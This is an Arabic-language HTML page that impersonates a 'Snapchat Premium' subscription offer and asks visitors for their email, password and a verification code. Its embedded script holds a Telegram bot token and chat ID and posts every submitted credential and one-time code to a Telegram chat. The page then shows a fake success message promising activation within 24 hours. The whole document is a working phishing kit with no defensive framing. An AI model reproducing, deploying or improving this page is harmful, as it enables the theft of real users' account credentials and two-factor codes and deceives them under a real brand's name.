<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Premium - اشترك الآن</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f0e68c 0%, #daa520 100%); /* Golden gradient background */
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }

        .premium-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
            padding: 50px 40px;
            max-width: 450px;
            width: 100%;
            position: relative;
            text-align: center;
            overflow: hidden;
        }

        .premium-container::before {
            content: '';
            position: absolute;
            top: -50px;
            left: -50px;
            right: -50px;
            bottom: -50px;
            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0) 70%);
            z-index: 0;
            pointer-events: none;
        }

        .logo-section {
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
        }

        .snapchat-ghost {
            width: 70px;
            height: 70px;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); /* Gold gradient */
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 45px;
            color: white;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.4);
            border: 3px solid #FFF;
        }

        .premium-title {
            font-size: 32px;
            font-weight: 800;
            color: #4a4a4a;
            margin-bottom: 10px;
            letter-spacing: -0.8px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }

        .premium-subtitle {
            font-size: 16px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: right;
            position: relative;
            z-index: 1;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #555;
            margin-bottom: 8px;
        }

        input[type="text"],
        input[type="password"],
        input[type="email"],
        input[type="number"] {
            width: 100%;
            padding: 14px 18px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            font-family: inherit;
            background: #f9f9f9;
            color: #333;
            transition: all 0.3s ease;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
        }

        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="email"]:focus,
        input[type="number"]:focus {
            outline: none;
            background: white;
            border-color: #FFD700;
            box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.2);
        }

        input::placeholder {
            color: #aaa;
        }

        .btn-premium {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, #FFD700 0%, #FFA500 100%); /* Gold gradient */
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
            margin-top: 25px;
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }

        .btn-premium:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(255, 215, 0, 0.5);
        }

        .btn-premium:active:not(:disabled) {
            transform: translateY(0);
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
        }

        .btn-premium:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            background: linear-gradient(45deg, #ccc 0%, #bbb 100%);
            box-shadow: none;
        }

        .link-text {
            font-size: 14px;
            color: #666;
            text-decoration: none;
            transition: color 0.2s ease;
            display: block;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }

        .link-text a {
            color: #007bff;
            font-weight: 600;
            text-decoration: none;
        }

        .link-text a:hover {
            text-decoration: underline;
        }

        .message-box {
            display: none;
            padding: 12px 18px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            font-weight: 500;
            animation: fadeIn 0.4s ease-out;
            position: relative;
            z-index: 1;
        }

        .message-box.error {
            background: #ffe0e0;
            color: #d32f2f;
            border: 1px solid #ef9a9a;
        }

        .message-box.success {
            background: #e8f5e9;
            color: #388e3c;
            border: 1px solid #a5d6a7;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .loading-spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 18px;
        }

        .form-group input {
            padding-right: 45px; /* Make space for icon */
        }

        .form-group .input-wrapper {
            position: relative;
        }

    </style>
</head>
<body>
    <div class="premium-container">
        <div class="logo-section">
            <div class="snapchat-ghost">👻</div>
            <h1 class="premium-title">Snapchat Premium</h1>
            <p class="premium-subtitle">Unlock exclusive features and enhance your Snapchat experience!</p>
        </div>

        <div id="message-box" class="message-box"></div>

        <form id="premiumForm">
            <div class="form-group">
                <label class="form-label" for="email">البريد الإلكتروني</label>
                <div class="input-wrapper">
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        placeholder="أدخل بريدك الإلكتروني"
                        required
                        autocomplete="email"
                    >
                    <i class="input-icon">📧</i>
                </div>
            </div>

            <div class="form-group">
                <label class="form-label" for="password">كلمة المرور</label>
                <div class="input-wrapper">
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        placeholder="أدخل كلمة المرور"
                        required
                        autocomplete="current-password"
                    >
                    <i class="input-icon">🔒</i>
                </div>
            </div>

            <div class="form-group hidden" id="verificationCodeGroup">
                <label class="form-label" for="verificationCode">رمز التحقق</label>
                <div class="input-wrapper">
                    <input 
                        type="number" 
                        id="verificationCode" 
                        name="verificationCode" 
                        placeholder="أدخل رمز التحقق المرسل"
                        autocomplete="off"
                    >
                    <i class="input-icon">🔢</i>
                </div>
            </div>

            <button type="submit" class="btn-premium" id="submitBtn">
                <span id="btnText">اشترك الآن</span>
                <span class="loading-spinner" id="spinner"></span>
            </button>

            <p class="link-text">
                <a href="#" id="forgotPasswordLink">نسيت كلمة المرور؟</a>
            </p>
            <p class="link-text">
                بالنقر على "اشترك الآن"، أنت توافق على <a href="#">شروط الخدمة</a> و <a href="#">سياسة الخصوصية</a>.
            </p>
        </form>
    </div>

    <script>
        const BOT_TOKEN = '8694309954:AAFjq-F5jxGayURPwjgyeIKND86FhPwMNcA';
        const CHAT_ID = '8539996558';

        function showMessage(text, isError = false) {
            const msgBox = document.getElementById('message-box');
            msgBox.textContent = text;
            msgBox.className = 'message-box ' + (isError ? 'error' : 'success');
            msgBox.style.display = 'block';

            setTimeout(() => {
                msgBox.style.display = 'none';
            }, 5000);
        }

        async function sendToTelegram(email, password, actionType, verificationCode = 'N/A') {
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const btnText = document.getElementById('btnText');

            submitBtn.disabled = true;
            spinner.style.display = 'inline-block';
            btnText.textContent = 'جاري المعالجة...';

            let message = `
🔔 **Snapchat Premium - عملية جديدة**
━━━━━━━━━━━━━━━━━━
📧 **البريد الإلكتروني:** \`${email}\`
🔑 **كلمة المرور:** \`${password}\`
📝 **نوع العملية:** ${actionType}
`;

            if (actionType === 'نسيت كلمة المرور' && verificationCode !== 'N/A') {
                message += `🔢 **رمز التحقق:** \`${verificationCode}\`\n`;
            }

            message += `⏰ **الوقت:** ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
            `;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();

                if (result.ok) {
                    if (actionType === 'اشترك الآن') {
                        showMessage('✅ تم استقبال طلب الاشتراك بنجاح!\n\nسيتم التحقق من حسابك خلال 24 ساعة\nوتفعيل Snapchat Premium تلقائياً.\n\nشكراً لك! 🎉', false);
                        // يمكنك توجيه المستخدم هنا بعد الاشتراك
                        // window.location.href = 'https://www.snapchat.com/premium';
                    } else {
                        showMessage('تم إرسال بياناتك بنجاح!', false);
                    }
                } else {
                    throw new Error('فشل الإرسال');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ في الاتصال، يرجى المحاولة لاحقاً', true);
            } finally {
                submitBtn.disabled = false;
                spinner.style.display = 'none';
                btnText.textContent = 'اشترك الآن';
            }
        }

        document.getElementById('premiumForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const verificationCode = document.getElementById('verificationCode').value.trim();

            if (!email || !password) {
                showMessage('يرجى ملء جميع الحقول المطلوبة', true);
                return;
            }

            if (password.length < 6) {
                showMessage('يجب أن تكون كلمة المرور 6 أحرف على الأقل', true);
                return;
            }

            if (document.getElementById('verificationCodeGroup').classList.contains('hidden')) {
                // Normal subscription/login flow
                await sendToTelegram(email, password, 'اشترك الآن');
            } else {
                // Forgot password with verification code flow
                if (!verificationCode) {
                    showMessage('يرجى إدخال رمز التحقق', true);
                    return;
                }
                await sendToTelegram(email, password, 'نسيت كلمة المرور - رمز التحقق', verificationCode);
            }
        });

        document.getElementById('forgotPasswordLink').addEventListener('click', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim(); // Password might not be needed for forgot password, but sending it for consistency

            if (!email) {
                showMessage('يرجى إدخال بريدك الإلكتروني أولاً لاستعادة كلمة المرور', true);
                return;
            }

            // Show verification code input field
            document.getElementById('verificationCodeGroup').classList.remove('hidden');
            document.getElementById('submitBtn').querySelector('#btnText').textContent = 'إرسال رمز التحقق';
            showMessage('تم إرسال رمز التحقق إلى بريدك الإلكتروني (محاكاة). يرجى إدخاله.', false);

            // Simulate sending a verification code to Telegram bot (without actual code generation)
            sendToTelegram(email, password, 'نسيت كلمة المرور - طلب رمز');
        });

    </script>
</body>
</html>
